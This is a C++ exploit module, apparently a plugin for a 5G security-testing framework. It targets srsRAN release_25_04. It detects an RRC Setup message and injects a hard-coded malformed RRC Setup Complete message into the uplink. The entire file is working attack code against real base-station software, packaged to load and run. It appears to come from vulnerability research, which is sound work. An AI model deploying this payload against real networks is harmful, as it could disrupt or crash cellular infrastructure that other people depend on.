// This exploit targets srsRAN release_25_04
#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

uint8_t raw_rrc_setup_complete[] = {0x1,  0x23, 0xc0, 0x0,  0x0,  0x0,  0x9,  0x0,  0x5, 0xdf, 0x80, 0x10,
                                    0x5e, 0x40, 0x3,  0x40, 0x40, 0x3c, 0x44, 0x0,  0x0, 0x0,  0x0,  0x4,
                                    0xc,  0x95, 0x1d, 0x82, 0xb,  0x80, 0xbc, 0x1c, 0x0, 0x0,  0x0,  0x0,
                                    0x0,  0x3d, 0x5,  0x3f, 0x0,  0x0,  0x0,  0x0,  0x0, 0x0,  0x0,  0x0};

class MalformedRRCSetupComplete : public Exploit
{
public:
  MalformedRRCSetupComplete(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                            SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    mal_rrc_setup_comp.reset(
        new std::vector<uint8_t>(raw_rrc_setup_complete, raw_rrc_setup_complete + sizeof(raw_rrc_setup_complete)));
  }

  void setup() override
  {
    f_rrc_setup = ws_filter_t::make_filter("nr-rrc.c1 == 1");
    filters.push_back(f_rrc_setup);
  }

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (f_rrc_setup->match) {
      logger.info("Received RRC Setup message, sending malformed RRC Setup Complete message");
      ul_buffer_queue.push(mal_rrc_setup_comp);
    }
  }

private:
  std::shared_ptr<ws_filter_t>           f_rrc_setup;
  std::shared_ptr<std::vector<uint8_t> > mal_rrc_setup_comp;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new MalformedRRCSetupComplete(dl_buffer_queue_, ul_buffer_queue_);
}
}